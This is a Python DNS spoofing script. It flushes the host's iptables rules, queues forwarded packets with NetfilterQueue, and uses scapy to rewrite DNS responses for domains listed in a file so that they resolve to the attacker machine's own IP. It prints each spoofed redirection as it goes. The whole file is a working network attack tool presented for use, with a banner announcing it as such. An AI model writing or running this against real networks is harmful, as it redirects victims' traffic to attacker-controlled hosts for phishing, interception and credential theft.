#!/usr/bin/python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import os
import re
import sys
import socket
import terminal_banner

colors = {
	'HEADER' : "\033[95m",
	'OKBLUE' : "\033[94m",
	'RED' : "\033[91m",
	'OKYELLOW' : "\033[93m",
	'GREEN' : "\033[92m",
	'LIGHTBLUE' : "\033[96m",
	'WARNING' : "\033[93m",
	'FAIL' : "\033[91m",
	'ENDC' : "\033[0m",
	'BOLD' : "\033[1m",
	'UNDERLINE' : "\033[4m" 
}

def banner():
	print(colors['HEADER'] +"")
	banner_text ="\t\tThis Project is working DNS spoof \n\n \t\t\tAuther : name \n"
	print(terminal_banner.Banner(banner_text))

register = {}

def host_ip():
	return re.search(re.compile(r'(?<=inet )(.*)(?=\/)',re.M),os.popen('ip addr show eth0').read()).groups()[0]

def valid_ip(ip):
	try:
		socket.inet_aton(ip)
		return True
	except:
		return False

def read_file(path):
	if(os.path.isfile(path) and os.stat(path).st_size > 0):
		file = open(path,"r")
		for line in file:
			if(line not in ['\n','\r\n']):
				try:
					key,value = line.split()
					register[key] = value
					# print(register[key].value)
				except:
					print(colors['FAIL'] + "Invalid File format <domain> <fake Ip address> "+ colors['ENDC'])
					sys.exit(1)
		file.close()
	else:
		print(colors['FAIL'] + "The file doen't exits " + colors['ENDC'])
		sys.exit(1)

def process_packet(pkt):
	scapy_packet = scapy.IP(pkt.get_payload())
	if(scapy_packet.haslayer(scapy.DNSRR)):
		qname = (scapy_packet[scapy.DNSQR].qname)[0:-1]
		for domain in register:
			if domain in str(qname):
				answer = scapy.DNSRR(rrname=qname,rdata=host_ip())
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1

				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.UDP].chksum
				del scapy_packet[scapy.UDP].len
				print(colors['GREEN']+"    [#] Spoofed response sent to "+colors['ENDC']+"["+scapy_packet[scapy.IP].dst+"]"+colors['WARNING']+": Redirecting "+colors['ENDC']+"["+qname+"]"+colors['WARNING']+" to "+colors['ENDC']+"["+host_ip()+"]")
				pkt.set_payload(str(scapy_packet))
	pkt.accept()

def main():
	banner()
	os.system('iptables --flush')
	os.system('iptables -I FORWARD -j NFQUEUE --queue-num 1')
	path = raw_input(colors['OKBLUE']+"Enter File path: " + colors['ENDC'])
	read_file(path)
	print(colors['GREEN'] +"\n\t DNS is Start Spoofing "+colors['ENDC'])

	queue = NetfilterQueue()
	queue.bind(1,process_packet)
	queue.run()

if __name__ == '__main__':
	main()
